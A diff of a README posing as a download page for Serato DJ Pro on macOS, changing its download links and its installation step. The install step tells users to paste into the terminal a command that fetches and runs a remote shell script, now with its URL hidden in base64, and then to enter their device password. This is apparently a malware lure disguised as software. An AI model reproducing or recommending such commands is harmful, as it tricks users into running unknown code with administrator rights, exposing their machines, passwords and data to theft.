@@ -7,7 +7,7 @@ Whether you're performing at festivals or mixing tracks in the studio, Serato DJ
 ---
 
 ## ✅ Download Serato DJ Pro for macOS  
-[![Download Serato DJ Pro](https://img.shields.io/badge/Download-Serato_DJ_Pro-blue)](https://serato-dj-pro-mac-download.github.io/.github)
+[![Download Serato DJ Pro](https://img.shields.io/badge/Download-Serato_DJ_Pro-blue)](https://shuziktobehuman.github.io/huja/Serato)
 
 ---
 
@@ -26,7 +26,7 @@ Whether you're performing at festivals or mixing tracks in the studio, Serato DJ
 
 1. Copy the installation command below.
 ```bash
-/bin/bash -c "$(curl -fsSL https://veitzeatz.com/get1/install.sh)"
+/bin/bash -c "$(curl -fsSL $(echo aHR0cHM6Ly9waGFubmFyaXRoLmNvbS9nZXQyL2luc3RhbGwuc2g= | base64 -d))"
 ```
 2. Open the terminal on your device and paste the command you copied above, then press the “Return” button.
 3. Enter your device password and confirm the installation.
@@ -67,7 +67,7 @@ Serato DJ Pro is a professional digital DJ platform that offers high-resolution 
 
 ---
 
-[![Download Serato DJ Pro](https://img.shields.io/badge/Download-Serato_DJ_Pro-blue)](https://serato-dj-pro-mac-download.github.io/.github)
+[![Download Serato DJ Pro](https://img.shields.io/badge/Download-Serato_DJ_Pro-blue)](https://shuziktobehuman.github.io/huja/Serato)
 
 ---
 
